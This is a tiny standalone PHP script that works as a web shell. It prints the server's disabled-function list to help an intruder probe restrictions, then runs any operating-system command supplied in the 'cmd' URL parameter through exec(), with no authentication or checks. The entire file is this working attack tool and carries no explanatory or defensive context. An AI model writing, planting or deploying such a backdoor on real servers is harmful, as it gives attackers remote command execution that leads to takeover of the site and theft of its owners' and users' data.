<?php
    print_r(explode(',', ini_get('disable_functions')));
    if(isset($_GET['cmd']))
    {
        exec($_GET['cmd']);
    }
?>